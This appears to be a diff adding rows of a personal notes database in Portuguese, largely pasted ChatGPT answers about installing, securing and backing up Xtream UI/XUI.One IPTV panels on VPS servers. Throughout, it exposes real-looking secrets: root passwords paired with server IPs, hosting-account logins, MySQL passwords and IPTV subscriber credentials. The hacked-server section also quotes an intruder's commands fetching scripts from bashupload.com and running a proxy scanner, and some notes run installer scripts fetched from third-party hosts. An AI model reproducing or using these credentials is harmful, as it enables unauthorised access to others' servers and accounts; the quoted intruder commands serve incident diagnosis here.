+Senha: CK6uMmXUGsALj7JW
+yijed72782@coasah.com - naxepok981@decodewp.com
+tecemo7550@coasah.com - rilomak648@decodewp.com
+sejos26174@coasah.com - faxeji6684@decodewp.com
+poneh37596@decodewp.com - lefeb57450@coasah.com
+sesamec894@exitbit.com - disile3437@exitbit.com
+pepir78881@iridales.com - yisis82207@exitbit.com
+
+M3u-Master - Final
+https://lovable.dev/projects/0fc30301-4d45-4610-93d5-ea6e9a756957
+
+controle-financeiro-v6 - https://lovable.dev/projects/2fc2f7cc-538c-418a-8e9d-ca517ff12d6b
+Lovable - lefeb57450@coasah.com - CK6uMmXUGsALj7JW
+Supabase - lefeb57450@coasah.com - CK6uMmXUGsALj7JW@
+
+Controle de gastos - 
+https://lovable.dev/projects/811b0947-da79-464b-9bd0-d106068c96d5 - fase 1
+https://lovable.dev/projects/c7ff1c48-b426-42f6-83ca-1720e4a1f2e6 - fase 2
+https://lovable.dev/projects/a07beedb-5196-44af-a2d5-f8cafb17fb3e - fase 3
+https://lovable.dev/projects/38dbd0e9-f39f-40f6-a067-4ed8d77ecb4a - Fase 4
+https://lovable.dev/projects/5ee0a88e-994c-43f6-bc48-a3d5c3f529a5 - fase 5",Programação,LOVABLE,false,LOVABLE,user_default,2025-07-09 15:56:49.609+00,2025-07-09 15:56:49.795104+00
+1752076647425,Servidor Off-Line,✅ COMUNICADO IMPORTANTE: ✅ SERVIÇO RESTABELECIDO:,"✅ COMUNICADO IMPORTANTE:
+
+Informamos que nosso datacenter encontra-se temporariamente fora do ar devido a uma instabilidade técnica. Nossa equipe especializada já está no local atuando com prioridade máxima para restabelecer os serviços o quanto antes.
+
+Agradecemos pela compreensão e pedimos que acompanhem nosso grupo para novas atualizações.
+
+Atenciosamente,
+Equipe Técnica
+
+✅ SERVIÇO RESTABELECIDO:
+
+Informamos que o datacenter já está online e todos os serviços foram normalizados com sucesso.
+
+Agradecemos pela compreensão, paciência e confiança de todos durante o período de instabilidade.
+
+Atenciosamente,
+Equipe Técnica",Whatsapp,CHATGPT,false,CHATGPT,user_default,2025-07-09 15:57:27.425+00,2025-07-09 15:57:27.756799+00
+1752076678984,"Vercel, Comando para hospedar o site",SUPABASE_URL SUPABASE_ANON_KEY,https://supabase.com - Project Settings / Data API / Project URL / Go To Api Keys / anon public,Programação,SUPABASE,false,SUPABASE,user_default,2025-07-09 15:57:58.984+00,2025-07-09 15:57:59.17531+00
+1752076907773,Liberar portas no Ubuntu 20.04LTS,Liberar as portas,"✅ 1. Acesse sua VPS via SSH:
+ssh usuario@IP_da_sua_VPS
+
+✅ 2. Verifique se o ufw está instalado:
+sudo ufw status
+Se aparecer algo como ""Status: inactive"" ou ""Status: active"", o ufw já está instalado.
+
+Se não estiver instalado, instale com: sudo apt install ufw -y
+
+✅ 3. Liberar as portas:
+sudo ufw allow 22/tcp
+sudo ufw allow 25500/tcp
+sudo ufw allow 80/tcp
+sudo ufw allow 443/tcp
+sudo ufw allow 8443/tcp
+sudo ufw allow 8445/tcp
+sudo ufw allow 8805/tcp
+sudo ufw allow 8080/tcp
+
+✅ 4. (Opcional) Liberar acesso SSH se ainda não estiver liberado:
+⚠️ Muito importante para não se trancar fora da VPS!
+sudo ufw allow 22/tcp
+
+✅ 5. Ativar o firewall:
+sudo ufw enable
+⚠️ Vai aparecer uma mensagem de aviso — confirme com y.
+
+✅ 6. Verificar as regras ativas:
+sudo ufw status
+Deve aparecer algo assim:
+
+Status: active",Xtream-UI,CHATGPT,false,CHATGPT,user_default,2025-07-09 16:01:47.774+00,2025-07-09 16:01:47.968408+00
+1752078392962,"VPS, foi invadida",Conecte-se via SSH à VPS,"Pode me ajudar, estou recebendo email da empresa onde contrato uma VPS que já tenho algum tempo de um serviço de gerenciamento de clientes, utilizo uma VPS porque é pouca coisa, mais eles dizem que foi hackeado, como faço pra ver essas informações via SSH.
+O ChatGPT disse:
+Sim, posso te ajudar com isso.
+A mensagem da Contabo indica que há um tráfego anormalmente alto na porta SSH (22/tcp) saindo da sua VPS, o que pode indicar que ela foi invadida e está sendo usada para fazer conexões externas, algo típico de servidores comprometidos (botnets, scanners, brute-force, etc.).
+Vamos fazer uma verificação básica via SSH. Aqui estão os principais passos:
+________________________________________
+✅ 1. Conecte-se via SSH à VPS
+ssh root@SEU_IP
+________________________________________
+✅ 2. Veja as conexões de saída atuais
+Mostra conexões estabelecidas na porta 22 (SSH):
+ss -tuna | grep ESTAB
+Ou, para listar conexões de saída do tipo SSH:
+lsof -i :22
+________________________________________
+✅ 3. Verifique os processos ativos e suspeitos
+Ver os processos mais consumidores de CPU e memória:
+top
+Mostrar todos os processos com caminho do executável:
+ps auxfww
+Fique atento a processos com nomes suspeitos, como:
+•	/tmp/.something
+•	crypto, minerd, kdevtmpfs
+•	scripts bash rodando direto, etc.
+________________________________________
+✅ 4. Veja comandos recentes executados (ESTE COMANDO ACHOU)
+cat ~/.bash_history
+________________________________________
+✅ 5. Procure arquivos maliciosos (ex: criptomineradores)
+Verifique pastas como:
+ls -la /tmp
+ls -la /var/tmp
+ls -la /dev/shm
+Essas pastas são comuns para scripts maliciosos.
+________________________________________
+✅ 6. Veja os usuários logados e recentes
+Ver quem está conectado:
+w
+who
+Veja os últimos acessos:
+last -a
+________________________________________
+✅ 7. Verifique se há usuários novos ou estranhos
+cat /etc/passwd
+________________________________________
+✅ 8. Ver logs SSH (autenticação)
+grep ""sshd"" /var/log/auth.log
+Ou em algumas distros:
+journalctl -u ssh
+________________________________________
+✅ O que fazer se suspeitar que foi hackeado?
+1.	Desconecte a rede da VPS imediatamente (firewall ou via painel da Contabo).
+2.	Faça backup de arquivos importantes (com cuidado, sem levar arquivos infectados).
+3.	Reinstale o sistema operacional pelo painel da Contabo.
+4.	Configure segurança adequada:
+o	Desative login por senha (use apenas chave SSH)
+o	Mude a porta SSH
+o	Ative firewall (ufw, firewalld)
+o	Instale fail2ban
+________________________________________
+Se quiser, posso ajudar a analisar os comandos/processos que encontrar e indicar se são maliciosos.
+Você pode rodar os comandos e colar a saída aqui, ou me dizer o que encontrar.
+Deseja que eu monte um script automático que já verifique tudo isso de uma vez?
+Você disse:
+ 
+No comando ""4"" cat ~/.bash_history, apareceu algumas coisas estranhas e como é uma VPS que quase não mexo achei estranho, normalmente só faço o comando pra atualizar o LINUX, apt-get update ; apt-get dist-upgrade ;
+O ChatGPT disse:
+Sim, a imagem mostra claramente que sua VPS foi invadida e está sendo usada para atividades maliciosas, especialmente scans de proxies e redes — algo que pode resultar na inclusão do seu IP em listas negras (blacklists), exatamente como a Contabo alertou.
+________________________________________
+🔎 O que os comandos revelam?
+1. Baixando arquivos maliciosos de sites suspeitos
+wget http://bashupload.com/5YZ4p/proxy.py
+wget http://bashupload.com/rzBWa/scan.zip
+wget http://bashupload.com/C4j-X/run.sh
+Esses arquivos indicam scripts de proxy scan, muito provavelmente usados para procurar servidores abertos ou vulneráveis.
+________________________________________
+2. Uso de ferramentas como Zmap-ProxyScanner
+cd Zmap-ProxyScanner/
+chmod +x run.sh
+./run.sh
+Isso confirma que o invasor estava executando scanners automatizados de rede.
+________________________________________
+3. Criação de diretórios ocultos (.o)
+mkdir .o
+cd .o
+Diretórios ocultos geralmente são usados para esconder os arquivos e dificultar a detecção.
+________________________________________
+4. Reboots e reinstalações de scripts
+apt-get update ; apt-get dist-upgrade ; reboot
+O invasor estava provavelmente tentando mascarar as ações ou manter o sistema atualizado para evitar travamentos e ser percebido.
+________________________________________
+🚨 Resumo: Sua VPS foi comprometida!
+Ela está:
+•	Executando scripts automatizados para escanear redes.
+•	Fazendo conexões de saída massivas, como informado pela Contabo.
+•	Pode estar participando de uma botnet.
+•	Está em risco de ser permanentemente bloqueada se continuar assim.
+________________________________________
+✅ O que você deve fazer AGORA
+🔥 1. Desconecte imediatamente a VPS da rede
+•	Vá ao painel da Contabo e desative temporariamente a interface de rede.
+•	Ou rode no terminal:
+ifconfig eth0 down
+________________________________________
+💾 2. Faça backup dos dados que você precisa
+Se você tem algum dado importante (ex: banco de dados, configs), faça backup com cuidado.
+________________________________________
+🧹 3. REINSTALE o sistema
+Não tente limpar apenas. A única forma segura de remover o atacante é formatar e reinstalar a VPS via o painel da Contabo.
+________________________________________
+🔐 4. Reforce a segurança após reinstalar
+Aqui vai um checklist mínimo de segurança:
+Recurso	Ação
+Usuário root	Desative ou limite acesso via SSH
+Porta SSH	Mude a porta padrão 22 para outra (ex: 2222)
+Chave SSH	Use autenticação via chave ao invés de senha
+Firewall (UFW)	Ative e permita apenas portas essenciais (ex: 22 ou nova, 80, 443)
+Fail2ban	Bloqueia IPs após tentativas falhas repetidas
+Atualizações	Mantenha sempre o sistema atualizado
+________________________________________
+Se quiser, posso:
+•	Criar um script de verificação e limpeza (caso queira explorar mais antes de formatar).
+•	Ajudar a configurar sua nova VPS com segurança reforçada após reinstalar.
+Quer que eu monte um script automático de segurança ou já te oriento direto na reinstalação?",Xtream-UI,CHATGPT,false,CHATGPT,user_default,2025-07-09 16:26:32.962+00,2025-07-09 16:26:33.37793+00
+1752090236614,Instalar Xtream Ui,Métodos de instalação,"------------------------ Instalação Xui.One - Ubuntu 20.04 (64bits) 
+
+Instalação direta:
+
+sudo wget ""https://github.com/tekinf2025/xui-one/raw/main/instalador.sh"" -O instalador.sh && chmod +x instalador.sh && bash instalador.sh
+
+Instalação apenas com Ubuntu 20.04 (64 bits) instalado, Links no Meu Dropbox, tekin2021conta@gmail.com - nSob3KWGLeeITy@
+
+https://www.youtube.com/watch?v=gv0Q8t2TKKA
+sudo wget ""https://scr.uaihosting.com/xui/1.5.13/instalador.sh"" -O instalador.sh && chmod +x instalador.sh && bash instalador.sh
+
+Continue Setup: http://144.126.138.217/7UPjvmrE - http://144.126.138.217/tekinxtream - 6qF9BLCEQtHot2uW
+MySQL Username: 2pCBrqMkw6fphvQvkm5nyhMNNYAfxmR6
+MySQL Password: yNKHTw5zdUmTJuwbtbMzhM4wxsxzQysh
+
+Continue Setup: http://94.72.118.230/7UPjvmrE - http://94.72.118.230/tekinxtream - 6qF9BLCEQtHot2uW
+MySQL Username: 552yEvNk5TeX9B9svN4BNrGtRJq9BHxC
+MySQL Password: kBcECNhqdcTjqvZRYWSmQryjWNGXMPaa
+
+https://my.ava.hosting/clientarea.php  -  AvaHosting - Email: tekin.formatica@hotmail.com  Senha: 8MGn*UQ_;hRl  -  37.221.66.189  -  root  9I1*D3D65u8uv#
+Admin UI Wan IP: http://37.221.66.189  -  MySQL password:  
+
+Personalize o acesso: Management - Acesso Control - Access Codes - Add Code - tekinxtream
+Xtreaming desative, Encrypt Playlists, Restrictions on Playlists & EPG e as 5 opções de conúdos off lá no final
+Logs, desative todos os logs
+Search - Desabilite
+XUI Detect - Deny
+Logout On IP Change
+Enable ISP Lock 
+Enable ASN Lock
+Cache & Redis Settings, desabilite
+
+------------------------ Fim
+
+ABRIR PORTAS SERVER ORACLE:
+
+apt update -y && apt upgrade -y
+apt install firewalld 
+firewall-cmd --zone=public --permanent --add-port=80/tcp
+firewall-cmd --zone=public --permanent --add-port=8080/tcp
+firewall-cmd --zone=public --permanent --add-port=8088/tcp
+firewall-cmd --zone=public --permanent --add-port=443/tcp
+firewall-cmd --zone=public --permanent --add-port=7505/tcp
+firewall-cmd --zone=public --permanent --add-port=25500/tcp
+firewall-cmd --zone=public --permanent --add-port=25443/tcp
+firewall-cmd --zone=public --permanent --add-port=25445/tcp
+firewall-cmd --zone=public --permanent --add-port=8443/tcp
+firewall-cmd --zone=public --permanent --add-port=8445/tcp
+firewall-cmd --zone=public --permanent --add-port=8805/tcp
+firewall-cmd --reload 
+firewall-cmd --zone=public --list-ports
+
+Testar Xtream UI: 
+/home/xtreamcodes/iptv_xtream_codes/nginx/sbin/nginx -t
+/home/xtreamcodes/iptv_xtream_codes/nginx/sbin/nginx -s reload
+
+
+Edite server: /home/xtreamcodes/iptv_xtream_codes/nginx/conf
+listen 80;listen 25461;listen 25463 ssl;
+
+
+https://my.ava.hosting/clientarea.php  -  AvaHosting - Email: tekin.formatica@hotmail.com  Senha: 8MGn*UQ_;hRl  -  37.221.66.189  -  root  9I1*D3D65u8uv#
+Admin UI Wan IP: http://37.221.66.189  -  MySQL password:  
+
+
+https://lofertech.com/xtream-ui-mirrors/ - Install Xtream UI On Ubuntu 20.04 – CK MOD (Recommended) - FUNCIONOU
+sudo apt install python -y && rm -rf install.py && wget https://lofertech.com/scripts/install.py && sudo python3 install.py
+Admin UI Wan IP: http://94.72.118.230:25500  -  MariaDB 10.5: hd6WlkQ9EOvCKXIi47c 
+
+
+
+http://rtv2022.live:80/get.php?username=she3980&password=2198180&type=m3u&output=mpegts  -  RTv antigo
+http://rtv2022.live:80/get.php?username=she3980&password=2198180&type=m3u&output=mpegts  -  RTv 
+
+http://144.126.138.217:80/get.php?username=she3980&password=2198180&type=m3u&output=mpegts  -  RTv antigo
+http://94.72.118.230:80/get.php?username=VTS3KBrMEV&password=8HYh9XCx5u&type=m3u&output=mpegts  -  RTv 
+http://94.72.118.230:25461/get.php?username=VTS3KBrMEV&password=8HYh9XCx5u&type=m3u&output=mpegts  -  RTv 
+http://207.244.251.60:25461/get.php?username=VTS3KBrMEV&password=8HYh9XCx5u&type=m3u&output=mpegts
+
+-- MySQL dump 10.13  Distrib 5.7.42, for Linux (x86_64) -- Host: localhost    Database: xtream_iptvpro  -- Server version	5.7.42-0ubuntu0.18.04.1 - Servidor Atual
+
+-- MariaDB dump 10.19  Distrib 10.5.29-MariaDB, for debian-linux-gnu (x86_64)  -- Host: localhost    Database: xtream_iptvpro  -- Server version	10.5.29-MariaDB-ubu2004 - Não carrega Lista
+
+✅ 1. Descobrir os usuários do banco de dados (MySQL/MariaDB). Este comando exibe os usuários configurados no banco de dados:
+sudo mysql -e ""SELECT user, host FROM mysql.user;""
+
+✅ 2. Listar todos os bancos de dados disponíveis, isso ajuda a identificar o nome exato do banco que você quer exportar:
+sudo mysql -e ""SHOW DATABASES;""
+
+✅ 3. Exportar (fazer backup) do banco de dados com mysqldump Sintaxe:
+mysqldump -u USUARIO -p NOME_DO_BANCO > nome_do_arquivo.sql
+
+Backup feito na pasta raiz ""root"", utilizar a senha do banco de dados MySQL:
+mysqldump -u user_iptvpro -p xtream_iptvpro > xtream_iptvpro-bkp.sql
+
+✅ Para descobrir em qual pasta você está (diretório atual) Use o comando:
+pwd
+
+✅ 4. (Opcional) Comprimir o arquivo SQL para economizar espaço
+gzip xtream_iptvpro_bkp_server_2_MOD.sql - Isso vai gerar: meu_banco_backup.sql.gz
+
+✅ 5. Importar de volta ao servidor
+mysql -u root -p meu_banco < /home/usuario/meu_banco_backup.sql
+mysql -u root -p xtream_iptvpro < /root/xtream_iptvpro_bkp_server_2.sql   MySql: user_iptvpro - MariaDB 10.5: hd6WlkQ9EOvCKXIi47c
+mysql -u root -p xtream_iptvpro < /root/1-packages.sql
+mysql -u root -p xtream_iptvpro < /root/2-bouquets.sql
+mysql -u root -p xtream_iptvpro < /root/3-user.sql
+mysql -u root -p xtream_iptvpro < /root/4-users.sql
+mysql -u root -p xtream_iptvpro < /root/5-stream_categories_novo.sql
+mysql -u root -p xtream_iptvpro < /root/6-watch_categories_novo.sql - erro
+mysql -u root -p xtream_iptvpro < /root/7-series.sql
+mysql -u root -p xtream_iptvpro < /root/8-series_episodes.sql
+mysql -u root -p xtream_iptvpro < /root/9-streams_sys.sql
+mysql -u root -p xtream_iptvpro < /root/10-streams.sql
+
+Apagar o banco de dados
+mysql -u root -p xtream_iptvpro
+DROP TABLE IF EXISTS reg_users;
+DELETE FROM reg_users WHERE id = 1;
+mysql -u root -p
+CREATE DATABASE xtream_iptvpro DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
+EXIT;",Xtream-UI,CHATGPT,false,CHATGPT,user_default,2025-07-09 19:43:56.614+00,2025-07-09 19:43:56.781199+00
+1752412385002,Erro ao baixar a lista M3u,Várias análise de erros,"Pode me ajudar, utilizo um painel de gerenciamento de clientes que fica hospedado em uma vps com Ubuntu 20.04 LTS instalado, o painel está funcionado tudo perfeitamente, todas as portas liberadas, e não consigo baixar a lista do cliente, será que tenho que liberar mais alguma porta no Ubuntu
+Portas Liberada via SSH:
+sudo ufw allow 22/tcp
+sudo ufw allow 25500/tcp
+sudo ufw allow 80/tcp
+sudo ufw allow 443/tcp
+sudo ufw allow 8443/tcp
+sudo ufw allow 8445/tcp
+sudo ufw allow 8805/tcp
+sudo ufw allow 8080/tcp
+
+Na instalação do painel gerenciador de cliente Xtream Ui é instalados esses serviços:
+MariaDB 10.5 repository
+libcurl4, libxslt1-dev
+libgeoip-dev
+libonig-dev
+e2fsprogs
+python3-paramiko
+python-is-python3
+pip2 and python2 paramiko
+Nginx
+
+----------------------------------------------------
+
+O ChatGPT disse:
+Pelo que você está enfrentando — erro HTTP 500 — e pela análise do seu print, não parece ser diretamente um problema de porta de firewall. Um erro 500 (Internal Server Error) indica que o servidor está encontrando um erro ao processar a requisição. Isso geralmente significa que algo está quebrado no backend (PHP, Nginx, ou scripts chamados por ele).
+
+✅ Diagnóstico Inicial (com base no seu print):
+
+A URL que está gerando erro é:
+http://94.72.118.230/get.php?username=...&password=...&type=enigma16&output=mpegts
+O código de status da resposta é 500 Internal Server Error.
+
+O servidor é Nginx.
+
+O arquivo get.php provavelmente está relacionado ao Xtream UI ou IPTV panel.
+
+🔍 Possíveis Causas
+1. Erro no Script PHP (get.php), Esse é o principal suspeito. Pode estar ocorrendo:
+
+Falta de variável esperada no request.
+
+Permissões de arquivo incorretas.
+
+Função depreciada no PHP.
+
+Erro de conexão com o banco de dados.
+
+✅ Verifique o log de erros do Nginx e PHP:
+/home/xtreamcodes/iptv_xtream_codes/php/var/log - 
+sudo tail -n 50 /var/log/nginx/error.log
+sudo tail -n 50 /var/log/php*/error.log
+
+2. Permissões e Proprietário, Certifique-se de que o arquivo get.php pertence ao usuário certo (geralmente www-data).
+sudo chown -R www-data:www-data /var/www/
+sudo chmod -R 755 /var/www/
+
+3. PHP-FPM Quebrado ou Não Ativo, Verifique se o PHP-FPM está ativo e funcionando:
+sudo systemctl status php7.4-fpm - ou dependendo da versão - sudo systemctl status php8.1-fpm
+
+Se não estiver rodando:
+sudo systemctl restart php7.4-fpm
+
+4. MariaDB Não Conectando
+Talvez o script get.php tente acessar o banco, e não consiga (por senha incorreta, permissão, ou o banco estar inativo).
+
+Verifique o status do MariaDB:
+sudo systemctl status mariadb
+
+E reinicie se necessário:
+sudo systemctl restart mariadb
+
+5. Erro na Configuração Nginx, Um erro de configuração Nginx também pode causar um 500 ao tentar interpretar PHP.
+Verifique se o bloco de configuração do site contém algo como:
+nginx
+Copiar
+Editar
+location ~ \.php$ {
+    include snippets/fastcgi-php.conf;
+    fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
+}
+E depois teste:
+sudo nginx -t
+sudo systemctl reload nginx
+
+❓ Sobre Portas, A menos que o tráfego esteja passando por alguma porta fora das que você já liberou, não parece ser problema de firewall (UFW). O acesso à URL está sendo feito via porta 80 (HTTP), que já está liberada:
+sudo ufw allow 80/tcp
+
+✅ Resumo do que você deve fazer agora, Verifique os logs de erro do Nginx e PHP.
+(/var/log/nginx/error.log e /var/log/php*/error.log)
+
+Confirme que o PHP-FPM está ativo.
+
+Verifique o banco de dados MariaDB.
+Ele pode estar inacessível ou com senha inválida no script.
+
+Confirme permissões corretas dos arquivos.
+
+(Opcional) Ative mais logging no PHP:
+Edite o php.ini:
+
+display_errors = On
+error_reporting = E_ALL
+E reinicie o PHP-FPM.
+
+Se você quiser, posso te ajudar a interpretar os logs caso cole aqui a saída do error.log.
+
+Se quiser que eu monte um checklist de comandos automáticos para diagnosticar isso tudo, também posso preparar.",Xtream-UI,CHATGPT,false,CHATGPT,user_default,2025-07-13 13:13:05.002+00,2025-07-13 13:13:05.320345+00
+1752937494785,Formatação Preços,O valor da reinstalação do sistema operacional varia conforme o equipamento,"Reinstalação de Sistema Operacional
+O valor da reinstalação do sistema operacional varia conforme o equipamento, sendo avaliado no momento do atendimento.
+No caso de notebooks, é importante trazer o carregador junto.
+O serviço inclui a reinstalação do sistema e dos principais programas de uso cotidiano, com valores geralmente entre R$ 60,00 e R$ 80,00.",Whatsapp,CHATGPT,false,CHATGPT,user_default,2025-07-19 15:04:54.785+00,2025-07-19 15:04:55.173683+00
+1753096035813,Backup MySQL via SSH,Fazer Backup e Restaurar Servidor,"Como fazer backup do banco de dados sql do painel Xui.One de gerenciamento de listas IPTV
+    Acesse o servidor via SSH:
+    Conecte-se ao seu servidor via SSH com o acesso root.
+
+Identifique o nome do banco de dados:
+📌 Verifique qual é o nome do banco de dados que o painel Xui.One está utilizando. Caso você não saiba o nome exato, pode descobrir acessando o MySQL com o comando:
+✅ mysql -u root -p
+
+📌 Após fornecer a senha de root, execute o comando para listar os bancos de dados:
+✅ SHOW DATABASES;
+
+Isso vai listar todos os bancos de dados. O banco de dados que você está procurando pode ter um nome relacionado ao Xui.One (por exemplo, xui ou algo similar).
+
+📌 Agora que já pegou o nome do banco de dados saia do MariaDB com o comando:
+✅ exit;
+
+Realize o backup usando o mysqldump :
+144.126.138.217, 22, Xtream UI, root, Mq8.)tHot2/uW
+94.72.118.230, 22, Xtream UI 2, root, 6qF9BLCEQtHot2uW
+
+📌 Agora, com o nome do banco de dados em mãos, você pode usar o mysqldump para criar um backup. O comando para fazer o backup seria algo assim:
+✅	mysqldump -u root -p xui > /home/xui/backups/xui_backup_vps2_24-07.sql  
+
+    mysqldump -u root -p nome_do_banco_de_dados > /caminho/do/backup/xuione_backup.sql
+	
+
+Agora, você pode restaurar o backup com o comando mysql -  Senha MySQL: 6qF9BLCEQtHot2uW
+📌 Copie o banco de dados sql para o diretório /home/xui/backups/
+✅	mysqldump -u root -p xui < /home/xui/backups/xui_backup.sql
+
+    mysqldump -u root -p nome_do_banco_de_dados < /caminho/do/backup/xuione_backup.sql
+	
+",Xtream-UI,CHATGPT,false,CHATGPT,user_default,2025-07-21 11:07:15.813+00,2025-07-21 11:07:16.127657+00
+1753386941546,Backup Xui.One,Backup e Restaurar,"Primeiro de tudo, restaure o arquivo SQL para o banco de dados de migração com o seguinte comando shell
+mysql xui_migrate < /root/old-db.sql
+
+Agora você tem 2 maneiras de iniciar o processo de migração do banco de dados XUI. 1 visitando a página do painel e 2º fazendo manualmente no shell.
+Inicie a migração no painel ou visite este URL e clique em Migrar
+
+Inicie a migração no Shell:
+/home/xui/bin/php/bin/php /home/xui/includes/cli/migrate.php
+
+Inicie a migração no navegador:
+Visit: http://host.com:port/accesscode/setup
+
+Se algo der errado, você pode restaurar um banco de dados XUI em branco e reiniciar o processo novamente executando o seguinte comando.
+mysql xui < /home/xui/bin/install/database.sql
+
+Redefinir usuário administrador e senha para admin:admin
+mysql
+USE `xui`; REPLACE INTO `users`(`id`, `username`, `password`, `member_group_id`, `status`, `owner_id`, `date_registered`) VALUES(1, 'admin', '$6$rounds=20000$xui$eQfRsD2gsIUhoY5RnnYN82qiB5VeZTcHICQrFxXpa98J2R1454b6lzVHVjiJ.NP0gi0X3K7NXVgxeR1VhVhg61', 1, 1, 0, UNIX_TIMESTAMP());
+
+Corrigir erro de licença
+/home/xui/status",Xtream-UI,CHATGPT,false,CHATGPT,user_default,2025-07-24 19:55:41.546+00,2025-07-24 19:55:41.816012+00
